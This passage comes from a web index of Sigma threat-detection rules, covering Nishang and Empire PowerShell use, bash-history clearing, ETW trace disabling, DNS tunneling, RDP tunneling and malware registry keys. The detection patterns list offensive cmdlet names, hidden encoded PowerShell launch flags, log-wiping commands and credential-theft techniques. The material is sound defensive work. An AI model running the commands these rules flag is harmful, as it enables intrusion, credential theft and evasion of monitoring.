Get-Information - Get-PassHints - Get-WLAN-Keys - Get-Web-Credentials - Invoke-CredentialsPhish - Invoke-MimikatzWDigestDowngrade - Invoke-SSIDExfil - Invoke-SessionGopher - Keylogger - Invoke-Interceptor - Create-MultipleSessions - Invoke-NetworkRelay - Run-EXEonRemote - Invoke-Prasadhak - Invoke-BruteForce - Password-List - Invoke-JSRatRegsvr - Invoke-JSRatRundll - Invoke-PoshRatHttps - Invoke-PowerShellIcmp - Invoke-PowerShellUdp - Invoke-PSGcat - Invoke-PsGcatAgent - Remove-PoshRat - Add-Persistance - ExetoText - Invoke-Decode - Invoke-Encode - Parse_Keys - Remove-Persistence - StringtoBase64 - TexttoExe - Powerpreter - Nishang - DataToEncode - LoggedKeys - OUT-DNSTXT # - Jitter # Prone to FPs - ExfilOption - DumpCerts - DumpCreds - Shellcode32 - Shellcode64 - NotAllNameSpaces - exfill - FakeDC condition: Nishang falsepositives: - Penetration testing level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_nishang_malicious_commandlets.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Malicious Nishang PowerShell Commandlets"},{"categories":null,"contents":"Detects change of user environment. Adversaries can insert code into these files to gain persistence each time a user logs in or opens a new shell.\nKnown false-positives Admin or User activity References MITRE Attack technique T1156; .bash_profile and .bashrc. Raw rule (edit) title: Edit of .bash_profile and .bashrc id: e74e15cc-c4b6-4c80-b7eb-dfe49feb7fe9 status: test description: Detects change of user environment. Adversaries can insert code into these files to gain persistence each time a user logs in or opens a new shell. author: Peter Matkovski references: - \u0026#39;MITRE Attack technique T1156; .bash_profile and .bashrc. \u0026#39; date: 2019/05/12 modified: 2022/02/22 logsource: product: linux service: auditd detection: selection: type: \u0026#39;PATH\u0026#39; name: - \u0026#39;/root/.bashrc\u0026#39; - \u0026#39;/root/.bash_profile\u0026#39; - \u0026#39;/root/.profile\u0026#39; - \u0026#39;/home/*/.bashrc\u0026#39; - \u0026#39;/home/*/.bash_profile\u0026#39; - \u0026#39;/home/*/.profile\u0026#39; - \u0026#39;/etc/profile\u0026#39; - \u0026#39;/etc/shells\u0026#39; - \u0026#39;/etc/bashrc\u0026#39; - \u0026#39;/etc/csh.cshrc\u0026#39; - \u0026#39;/etc/csh.login\u0026#39; condition: selection falsepositives: - Admin or User activity level: medium tags: - attack.s0003 - attack.persistence - attack.t1546.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_alter_bash_profile.yml/","tags":["attack.s0003","attack.persistence","attack.t1546.004"],"title":"Edit of .bash_profile and .bashrc"},{"categories":null,"contents":"Detects suspicious powershell command line parameters used in Empire\nKnown false-positives Other tools that incidentally use the same command line parameters References https://github.com/EmpireProject/Empire/blob/c2ba61ca8d2031dad0cfc1d5770ba723e8b710db/lib/common/helpers.py#L165 https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/deaduser.py#L191 https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/resolver.py#L178 https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-EventVwrBypass.ps1#L64 Raw rule (edit) title: Empire PowerShell Launch Parameters id: 79f4ede3-402e-41c8-bc3e-ebbf5f162581 status: test description: Detects suspicious powershell command line parameters used in Empire author: Florian Roth references: - https://github.com/EmpireProject/Empire/blob/c2ba61ca8d2031dad0cfc1d5770ba723e8b710db/lib/common/helpers.py#L165 - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/deaduser.py#L191 - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/resolver.py#L178 - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-EventVwrBypass.ps1#L64 date: 2019/04/20 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - \u0026#39; -NoP -sta -NonI -W Hidden -Enc \u0026#39; - \u0026#39; -noP -sta -w 1 -enc \u0026#39; - \u0026#39; -NoP -NonI -W Hidden -enc \u0026#39; - \u0026#39; -noP -sta -w 1 -enc\u0026#39; - \u0026#39; -enc SQB\u0026#39; - \u0026#39; -nop -exec bypass -EncodedCommand \u0026#39; condition: selection falsepositives: - Other tools that incidentally use the same command line parameters level: critical tags: - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_powershell_empire_launch.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Empire PowerShell Launch Parameters"},{"categories":null,"contents":"Detects local user creation on windows servers, which shouldn\u0026rsquo;t happen in an Active Directory environment. Apply this Sigma Use Case on your windows server logs and not on your DC logs.\nKnown false-positives Domain Controller Logs Local accounts managed by privileged account management tools References https://patrick-bareiss.com/detecting-local-user-creation-in-ad-with-sigma/ Raw rule (edit) title: Local User Creation id: 66b6be3d-55d0-4f47-9855-d69df21740ea status: test description: Detects local user creation on windows servers, which shouldn\u0026#39;t happen in an Active Directory environment. Apply this Sigma Use Case on your windows server logs and not on your DC logs. author: Patrick Bareiss references: - https://patrick-bareiss.com/detecting-local-user-creation-in-ad-with-sigma/ date: 2019/04/18 modified: 2021/01/17 logsource: product: windows service: security detection: selection: Provider_Name: Microsoft-Windows-Security-Auditing EventID: 4720 condition: selection fields: - EventCode - AccountName - AccountDomain falsepositives: - Domain Controller Logs - Local accounts managed by privileged account management tools level: low tags: - attack.persistence - attack.t1136.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_user_creation.yml/","tags":["attack.persistence","attack.t1136.001"],"title":"Local User Creation"},{"categories":null,"contents":"Detects registry keys created in OceanLotus (also known as APT32) attacks\nKnown false-positives Unknown References https://www.welivesecurity.com/2019/03/20/fake-or-fake-keeping-up-with-oceanlotus-decoys/ https://github.com/eset/malware-ioc/tree/master/oceanlotus Raw rule (edit) title: OceanLotus Registry Activity id: 4ac5fc44-a601-4c06-955b-309df8c4e9d4 status: experimental description: Detects registry keys created in OceanLotus (also known as APT32) attacks references: - https://www.welivesecurity.com/2019/03/20/fake-or-fake-keeping-up-with-oceanlotus-decoys/ - https://github.com/eset/malware-ioc/tree/master/oceanlotus tags: - attack.defense_evasion - attack.t1112 author: megan201296, Jonhnathan Ribeiro date: 2019/04/14 modified: 2021/09/17 logsource: category: registry_event product: windows detection: ioc_1: TargetObject: \u0026#39;HKCU\\SOFTWARE\\Classes\\CLSID\\{E08A0F4B-1F65-4D4D-9A09-BD4625B9C5A1}\\Model\u0026#39; ioc_2: TargetObject|startswith: - HKCU\\SOFTWARE\\App\\ - HKLM\\SOFTWARE\\App\\ TargetObject|contains: - AppXbf13d4ea2945444d8b13e2121cb6b663\\ - AppX70162486c7554f7f80f481985d67586d\\ - AppX37cc7fdccd644b4f85f4b22d5a3f105a\\ TargetObject|endswith: - Application - DefaultIcon selection2: TargetObject|startswith: - \u0026#39;HKCU\\\u0026#39; TargetObject|contains: # HKCU\\SOFTWARE\\Classes\\AppXc52346ec40fb4061ad96be0e6cb7d16a\\ - \u0026#39;Classes\\AppXc52346ec40fb4061ad96be0e6cb7d16a\\\u0026#39; # HKCU\\SOFTWARE\\Classes\\AppX3bbba44c6cae4d9695755183472171e2\\ - \u0026#39;Classes\\AppX3bbba44c6cae4d9695755183472171e2\\\u0026#39; # HKCU\\SOFTWARE\\Classes\\CLSID\\{E3517E26-8E93-458D-A6DF-8030BC80528B}\\ - \u0026#39;Classes\\CLSID\\{E3517E26-8E93-458D-A6DF-8030BC80528B}\\\u0026#39; - \u0026#39;Classes\\CLSID\\{E08A0F4B-1F65-4D4D-9A09-BD4625B9C5A1}\\Model\u0026#39; condition: ioc_1 or ioc_2 or selection2 falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_apt_oceanlotus_registry.yml/","tags":["attack.defense_evasion","attack.t1112"],"title":"OceanLotus Registry Activity"},{"categories":null,"contents":"Normally, DNS logs contain a limited amount of different dns queries for a single domain. This rule detects a high amount of queries for a single domain, which can be an indicator that DNS is used to transfer data.\nKnown false-positives Valid software, which uses dns for transferring data References https://zeltser.com/c2-dns-tunneling/ https://patrick-bareiss.com/detect-c2-traffic-over-dns-using-sigma/ Raw rule (edit) title: Possible DNS Tunneling id: 1ec4b281-aa65-46a2-bdae-5fd830ed914e status: test description: Normally, DNS logs contain a limited amount of different dns queries for a single domain. This rule detects a high amount of queries for a single domain, which can be an indicator that DNS is used to transfer data. author: Patrick Bareiss references: - https://zeltser.com/c2-dns-tunneling/ - https://patrick-bareiss.com/detect-c2-traffic-over-dns-using-sigma/ date: 2019/04/07 modified: 2021/11/27 logsource: category: dns detection: selection: parent_domain: \u0026#39;*\u0026#39; condition: selection | count(dns_query) by parent_domain \u0026gt; 1000 falsepositives: - Valid software, which uses dns for transferring data level: high tags: - attack.command_and_control - attack.t1071.004 - attack.exfiltration - attack.t1048.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/net_dns_c2_detection.yml/","tags":["attack.command_and_control","attack.t1071.004","attack.exfiltration","attack.t1048.003"],"title":"Possible DNS Tunneling"},{"categories":null,"contents":"Clear command history in linux which is used for defense evasion.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.003/T1070.003.md https://attack.mitre.org/techniques/T1070/003/ https://www.hackers-arise.com/single-post/2016/06/20/Covering-your-BASH-Shell-Tracks-AntiForensics Raw rule (edit) title: Clear Command History id: fdc88d25-96fb-4b7c-9633-c0e417fdbd4e status: experimental description: Clear command history in linux which is used for defense evasion. # Example config for this one (place it in .bash_profile): # (is_empty=false; inotifywait -m .bash_history | while read file; do if [ $(wc -l \u0026lt;.bash_history) -lt 1 ]; then if [ \u0026#34;$is_empty\u0026#34; = false ]; then logger -i -p local5.info -t empty_bash_history \u0026#34;$USER : ~/.bash_history is empty \u0026#34;; is_empty=true; fi; else is_empty=false; fi; done ) \u0026amp; # It monitors the size of .bash_history and log the words \u0026#34;empty_bash_history\u0026#34; whenever a previously not empty bash_history becomes empty # We define an empty file as a document with 0 or 1 lines (it can be a line with only one space character for example) # It has two advantages over the version suggested by Patrick Bareiss : # - it is not relative to the exact command used to clear .bash_history : for instance Caldera uses \u0026#34;\u0026gt; .bash_history\u0026#34; to clear the history and this is not one the commands listed here. We can\u0026#39;t be exhaustive for all the possibilities ! # - the method suggested by Patrick Bareiss logs all the commands entered directly in a bash shell. therefore it may miss some events (for instance it doesn\u0026#39;t log the commands launched from a Caldera agent). Here if .bash_history is cleared, it will always be detected author: Patrick Bareiss date: 2019/03/24 modified: 2021/11/24 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.003/T1070.003.md - https://attack.mitre.org/techniques/T1070/003/ - https://www.hackers-arise.com/single-post/2016/06/20/Covering-your-BASH-Shell-Tracks-AntiForensics logsource: product: linux detection: keywords: - \u0026#39;rm *bash_history\u0026#39; - \u0026#39;echo \u0026#34;\u0026#34; \u0026gt; *bash_history\u0026#39; - \u0026#39;cat /dev/null \u0026gt; *bash_history\u0026#39; - \u0026#39;cat /dev/zero \u0026gt; *bash_history\u0026#39; - \u0026#39;ln -sf /dev/null *bash_history\u0026#39; - \u0026#39;ln -sf /dev/zero *bash_history\u0026#39; - \u0026#39;truncate -s0 *bash_history\u0026#39; # - \u0026#39;unset HISTFILE\u0026#39; # prone to false positives - \u0026#39;export HISTFILESIZE=0\u0026#39; - \u0026#39;history -c\u0026#39; - \u0026#39;history -w\u0026#39; - \u0026#39;shred *bash_history\u0026#39; - \u0026#39;empty_bash_history\u0026#39; - \u0026#39;chattr +i *bash_history\u0026#39; condition: keywords falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1070.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/builtin/lnx_shell_clear_cmd_history.yml/","tags":["attack.defense_evasion","attack.t1070.003"],"title":"Clear Command History"},{"categories":null,"contents":"Detects a command that clears or disables any ETW trace log which could indicate a logging evasion.\nKnown false-positives Unknown References https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil https://abuse.io/lockergoga.txt https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63 Raw rule (edit) title: Disable of ETW Trace id: a238b5d0-ce2d-4414-a676-7a531b3d13d6 status: test description: Detects a command that clears or disables any ETW trace log which could indicate a logging evasion. author: \u0026#39;@neu5ron, Florian Roth, Jonhnathan Ribeiro, oscd.community\u0026#39; references: - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil - https://abuse.io/lockergoga.txt - https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63 date: 2019/03/22 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection_clear_1: CommandLine|contains|all: - \u0026#39;cl\u0026#39; - \u0026#39;/Trace\u0026#39; selection_clear_2: CommandLine|contains|all: - \u0026#39;clear-log\u0026#39; - \u0026#39;/Trace\u0026#39; selection_disable_1: CommandLine|contains|all: - \u0026#39;sl\u0026#39; - \u0026#39;/e:false\u0026#39; selection_disable_2: CommandLine|contains|all: - \u0026#39;set-log\u0026#39; - \u0026#39;/e:false\u0026#39; selection_disable_3: #Autologger provider removal CommandLine|contains|all: - \u0026#39;Remove-EtwTraceProvider\u0026#39; - \u0026#39;EventLog-Microsoft-Windows-WMI-Activity-Trace\u0026#39; - \u0026#39;{1418ef04-b0b4-4623-bf7e-d74ab47bbdaa}\u0026#39; selection_disable_4: #Provider “Enable” property modification CommandLine|contains|all: - \u0026#39;Set-EtwTraceProvider\u0026#39; - \u0026#39;{1418ef04-b0b4-4623-bf7e-d74ab47bbdaa}\u0026#39; - \u0026#39;EventLog-Microsoft-Windows-WMI-Activity-Trace\u0026#39; - \u0026#39;0x11\u0026#39; selection_disable_5: #ETW provider removal from a trace session CommandLine|contains|all: - \u0026#39;logman\u0026#39; - \u0026#39;update\u0026#39; - \u0026#39;trace\u0026#39; - \u0026#39;--p\u0026#39; - \u0026#39;-ets\u0026#39; condition: 1 of selection* falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1070 - attack.t1562.006 - car.2016-04-002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_etw_trace_evasion.yml/","tags":["attack.defense_evasion","attack.t1070","attack.t1562.006","car.2016-04-002"],"title":"Disable of ETW Trace"},{"categories":null,"contents":"Detection for mshta.exe suspicious execution patterns sometimes involving file polyglotism\nKnown false-positives False positives depend on scripts and administrative tools used in the monitored environment References http://blog.sevagas.com/?Hacking-around-HTA-files https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356 https://docs.microsoft.com/en-us/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997 https://twitter.com/mattifestation/status/1326228491302563846 Raw rule (edit) title: MSHTA Suspicious Execution 01 id: cc7abbd0-762b-41e3-8a26-57ad50d2eea3 status: test description: Detection for mshta.exe suspicious execution patterns sometimes involving file polyglotism author: Diego Perez (@darkquassar), Markus Neis, Swisscom (Improve Rule) references: - http://blog.sevagas.com/?Hacking-around-HTA-files - https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356 - https://docs.microsoft.com/en-us/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script - https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997 - https://twitter.com/mattifestation/status/1326228491302563846 date: 2019/02/22 modified: 2021/12/01 logsource: category: process_creation product: windows detection: selection1: Image|endswith: \u0026#39;\\mshta.exe\u0026#39; CommandLine|contains: - \u0026#39;vbscript\u0026#39; - \u0026#39;.jpg\u0026#39; - \u0026#39;.png\u0026#39; - \u0026#39;.lnk\u0026#39; # - \u0026#39;.chm\u0026#39; # could be prone to false positives - \u0026#39;.xls\u0026#39; - \u0026#39;.doc\u0026#39; - \u0026#39;.zip\u0026#39; - \u0026#39;.dll\u0026#39; - \u0026#39;.exe\u0026#39; condition: selection1 falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: high tags: - attack.defense_evasion - attack.t1140 - attack.t1218.005 - attack.execution - attack.t1059.007 - cve.2020.1599 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_mshta_execution.yml/","tags":["attack.defense_evasion","attack.t1140","attack.t1218.005","attack.execution","attack.t1059.007","cve.2020.1599"],"title":"MSHTA Suspicious Execution 01"},{"categories":null,"contents":"Detects activity that could be related to Baby Shark malware\nKnown false-positives unknown References https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/ Raw rule (edit) title: Baby Shark Activity id: 2b30fa36-3a18-402f-a22d-bf4ce2189f35 status: test description: Detects activity that could be related to Baby Shark malware author: Florian Roth references: - https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/ date: 2019/02/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine: - reg query \u0026#34;HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\u0026#34; - powershell.exe mshta.exe http* - cmd.exe /c taskkill /im cmd.exe condition: selection falsepositives: - unknown level: high tags: - attack.execution - attack.t1059.003 - attack.t1059.001 - attack.discovery - attack.t1012 - attack.defense_evasion - attack.t1218.005 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_babyshark.yml/","tags":["attack.execution","attack.t1059.003","attack.t1059.001","attack.discovery","attack.t1012","attack.defense_evasion","attack.t1218.005"],"title":"Baby Shark Activity"},{"categories":null,"contents":"Detects Russian group activity as described in Global Threat Report 2019 by Crowdstrike\nKnown false-positives unknown References https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/ Raw rule (edit) title: Judgement Panda Credential Access Activity id: b83f5166-9237-4b5e-9cd4-7b5d52f4d8ee status: test description: Detects Russian group activity as described in Global Threat Report 2019 by Crowdstrike author: Florian Roth references: - https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/ date: 2019/02/21 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: Image|endswith: \u0026#39;\\xcopy.exe\u0026#39; CommandLine|contains|all: - \u0026#39;/S\u0026#39; - \u0026#39;/E\u0026#39; - \u0026#39;/C\u0026#39; - \u0026#39;/Q\u0026#39; - \u0026#39;/H\u0026#39; - \u0026#39;\\\\\u0026#39; selection2: Image|endswith: \u0026#39;\\adexplorer.exe\u0026#39; CommandLine|contains|all: - \u0026#39;-snapshot\u0026#39; - \u0026#39;\u0026#34;\u0026#34;\u0026#39; - \u0026#39;c:\\users\\\u0026#39; condition: selection1 or selection2 falsepositives: - unknown level: critical tags: - attack.credential_access - attack.t1552.001 - attack.t1003.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_bear_activity_gtr19.yml/","tags":["attack.credential_access","attack.t1552.001","attack.t1003.003"],"title":"Judgement Panda Credential Access Activity"},{"categories":null,"contents":"Detects svchost hosting RDP termsvcs communicating with the loopback address\nKnown false-positives unknown References https://twitter.com/SBousseaden/status/1096148422984384514 https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES/blob/master/Command%20and%20Control/DE_RDP_Tunnel_5156.evtx Raw rule (edit) title: RDP over Reverse SSH Tunnel WFP id: 5bed80b6-b3e8-428e-a3ae-d3c757589e41 status: experimental description: Detects svchost hosting RDP termsvcs communicating with the loopback address references: - https://twitter.com/SBousseaden/status/1096148422984384514 - https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES/blob/master/Command%20and%20Control/DE_RDP_Tunnel_5156.evtx author: Samir Bousseaden date: 2019/02/16 modified: 2021/07/06 tags: - attack.defense_evasion - attack.command_and_control - attack.lateral_movement - attack.t1090.001 - attack.t1090.002 - attack.t1021.001 - car.2013-07-002 logsource: product: windows service: security detection: selection: EventID: 5156 sourceRDP: SourcePort: 3389 DestAddress: - \u0026#39;127.*\u0026#39; - \u0026#39;::1\u0026#39; destinationRDP: DestPort: 3389 SourceAddress: - \u0026#39;127.*\u0026#39; - \u0026#39;::1\u0026#39; condition: selection and ( sourceRDP or destinationRDP ) falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_rdp_reverse_tunnel.yml/","tags":["attack.defense_evasion","attack.command_and_control","attack.lateral_movement","attack.t1090.001","attack.t1090.002","attack.t1021.001","car.2013-07-002"],"title":"RDP over Reverse SSH Tunnel WFP"},{"categories":null,"contents":"Detects new registry key created by Ursnif malware.\nKnown false-positives Unknown References https://blog.yoroi.company/research/ursnif-long-live-the-steganography/ https://blog.trendmicro.com/trendlabs-security-intelligence/phishing-campaign-uses-hijacked-emails-to-deliver-ursnif-by-replying-to-ongoing-threads/ Raw rule (edit) title: Ursnif id: 21f17060-b282-4249-ade0-589ea3591558 status: experimental description: Detects new registry key created by Ursnif malware. references: - https://blog.yoroi.company/research/ursnif-long-live-the-steganography/ - https://blog.trendmicro.com/trendlabs-security-intelligence/phishing-campaign-uses-hijacked-emails-to-deliver-ursnif-by-replying-to-ongoing-threads/ tags: - attack.execution - attack.t1112 author: megan201296 date: 2019/02/13 modified: 2021/11/15 logsource: product: windows category: registry_event detection: selection: TargetObject|contains: \u0026#39;\\Software\\AppDataLow\\Software\\Microsoft\\\u0026#39; filter: TargetObject|contains: - \u0026#39;\\SOFTWARE\\AppDataLow\\Software\\Microsoft\\Internet Explorer\\\u0026#39; - \u0026#39;\\SOFTWARE\\AppDataLow\\Software\\Microsoft\\RepService\\\u0026#39; - \u0026#39;\\SOFTWARE\\AppDataLow\\Software\\Microsoft\\IME\\\u0026#39; - \u0026#39;\\SOFTWARE\\AppDataLow\\Software\\Microsoft\\Edge\\\u0026#39; condition: selection and not filter falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_mal_ursnif.yml/","tags":["attack.execution","attack.t1112"],"title":"Ursnif"},{"categories":null,"contents":"Detects keywords that could indicate the use of some PowerShell exploitation framework\nKnown false-positives Penetration tests References https://posts.specterops.io/entering-a-covenant-net-command-and-control-e11038bcf462 https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1 https://github.com/hlldz/Invoke-Phant0m/blob/master/Invoke-Phant0m.ps1 https://gist.github.com/MHaggis/0dbe00ad401daa7137c81c99c268cfb7 Raw rule (edit) title: Suspicious PowerShell Keywords id: 1f49f2ab-26bc-48b3-96cc-dcffbc93eadf status: experimental description: Detects keywords that could indicate the use of some PowerShell exploitation framework date: 2019/02/11 modified: 2021/10/16 author: Florian Roth, Perez Diego (@darkquassar) references: - https://posts.specterops.io/entering-a-covenant-net-command-and-control-e11038bcf462 - https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1 - https://github.com/hlldz/Invoke-Phant0m/blob/master/Invoke-Phant0m.ps1 - https://gist.github.com/MHaggis/0dbe00ad401daa7137c81c99c268cfb7 tags: - attack.execution - attack.t1059.001 logsource: product: windows category: ps_script definition: Script block logging must be enabled for 4104 detection: framework: ScriptBlockText|contains: - \u0026#39;System.Reflection.Assembly.Load($\u0026#39; - \u0026#39;[System.Reflection.Assembly]::Load($\u0026#39; - \u0026#39;[Reflection.Assembly]::Load($\u0026#39; - \u0026#39;System.Reflection.AssemblyName\u0026#39; - \u0026#39;Reflection.Emit.AssemblyBuilderAccess\u0026#39; - \u0026#39;Runtime.InteropServices.DllImportAttribute\u0026#39; - \u0026#39;SuspendThread\u0026#39; - \u0026#39;rundll32\u0026#39; # - \u0026#39;FromBase64\u0026#39; - \u0026#39;Invoke-WMIMethod\u0026#39; - \u0026#39;http://127.0.0.1\u0026#39; condition: framework falsepositives: - Penetration tests level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_suspicious_keywords.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Suspicious PowerShell Keywords"},{"categories":null,"contents":"Detects HTTP requests used by Chafer malware\nKnown false-positives Unknown References https://securelist.com/chafer-used-remexi-malware/89538/ Raw rule (edit) title: Chafer Malware URL Pattern id: fb502828-2db0-438e-93e6-801c7548686d status: test description: Detects HTTP requests used by Chafer malware author: Florian Roth references: - https://securelist.com/chafer-used-remexi-malware/89538/ date: 2019/01/31 modified: 2021/11/27 logsource: category: proxy detection: selection: c-uri|contains: \u0026#39;/asp.asp?ui=\u0026#39; condition: selection fields: - ClientIP - c-uri - c-useragent falsepositives: - Unknown level: critical tags: - attack.command_and_control - attack.t1071.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_chafer_malware.yml/","tags":["attack.command_and_control","attack.t1071.001"],"title":"Chafer Malware URL Pattern"},{"categories":null,"contents":"Detects URL pattern used by iOS Implant\nKnown false-positives Unknown References https://googleprojectzero.blogspot.com/2019/08/implant-teardown.html https://twitter.com/craiu/status/1167358457344925696 Raw rule (edit) title: iOS Implant URL Pattern id: e06ac91d-b9e6-443d-8e5b-af749e7aa6b6 status: test description: Detects URL pattern used by iOS Implant author: Florian Roth references: - https://googleprojectzero.blogspot.com/2019/08/implant-teardown.html - https://twitter.com/craiu/status/1167358457344925696 date: 2019/08/30 modified: 2021/11/27 logsource: category: proxy detection: selection: c-uri|contains: \u0026#39;/list/suc?name=\u0026#39; condition: selection fields: - ClientIP - c-uri - c-useragent falsepositives: - Unknown level: critical tags: - attack.execution - attack.t1203 - attack.collection - attack.t1005 - attack.t1119 - attack.credential_access - attack.t1528 - attack.t1552.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_ios_implant.yml/","tags":["attack.execution","attack.t1203","attack.collection","attack.t1005","attack.t1119","attack.credential_access","attack.t1528","attack.t1552.001"],"title":"iOS Implant URL Pattern"},{"categories":null,"contents":"RDP login with localhost source address may be a tunnelled login\nKnown false-positives Unknown References https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html Raw rule (edit) title: RDP Login from Localhost id: 51e33403-2a37-4d66-a574-1fda1782cc31 description: RDP login with localhost source address may be a tunnelled login references: - https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html date: 2019/01/28 modified: 2021/07/07 tags: - attack.lateral_movement - car.2013-07-002 - attack.t1021.001 status: experimental author: Thomas Patzke logsource: product: windows service: security detection: selection: EventID: 4624 LogonType: 10 IpAddress: - \u0026#39;::1\u0026#39; - \u0026#39;127.0.0.1\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_rdp_localhost_login.yml/","tags":["attack.lateral_movement","car.2013-07-002","attack.t1021.001"],"title":"RDP Login from Localhost"},{"categories":null,"contents":"Detects an issue in apache logs that reports threading related errors\nKnown false-positives https://bz.apache.org/bugzilla/show_bug.cgi?id=46185 References https://github.com/hannob/apache-uaf/blob/master/README.md Raw rule (edit) title: Apache Threading Error id: e9a2b582-3f6a-48ac-b4a1-6849cdc50b3c status: test description: Detects an issue in apache logs that reports threading related errors author: Florian Roth references: - https://github.com/hannob/apache-uaf/blob/master/README.md date: 2019/01/22 modified: 2021/11/27 logsource: product: apache detection: keywords: - \u0026#39;__pthread_tpp_change_priority: Assertion `new_prio == -1 || (new_prio \u0026gt;= fifo_min_prio \u0026amp;\u0026amp; new_prio \u0026lt;= fifo_max_prio)\u0026#39; condition: keywords falsepositives: - https://bz.apache.org/bugzilla/show_bug.cgi?id=46185 level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_apache_threading_error.yml/","tags":null,"title":"Apache Threading Error"},{"categories":null,"contents":"Detects suspicious commands that could be related to activity that uses volume shadow copy to steal and retrieve hashes from the NTDS.dit file remotely\nKnown false-positives Administrative activity References https://www.swordshield.com/2015/07/getting-hashes-from-ntds-dit-file/ https://room362.com/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/ https://www.trustwave.com/Resources/SpiderLabs-Blog/Tutorial-for-NTDS-goodness-(VSSADMIN,-WMIS,-NTDS-dit,-SYSTEM)/ https://securingtomorrow.mcafee.com/mcafee-labs/new-teslacrypt-ransomware-arrives-via-spam/ https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/ Raw rule (edit) title: Activity Related to NTDS.dit Domain Hash Retrieval id: b932b60f-fdda-4d53-8eda-a170c1d97bbd status: deprecated description: Detects suspicious commands that could be related to activity that uses volume shadow copy to steal and retrieve hashes from the NTDS.dit file remotely author: Florian Roth, Michael Haag date: 2019/01/16 references: - https://www.swordshield.com/2015/07/getting-hashes-from-ntds-dit-file/ - https://room362.com/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/ - https://www.trustwave.com/Resources/SpiderLabs-Blog/Tutorial-for-NTDS-goodness-(VSSADMIN,-WMIS,-NTDS-dit,-SYSTEM)/ - https://securingtomorrow.mcafee.com/mcafee-labs/new-teslacrypt-ransomware-arrives-via-spam/ - 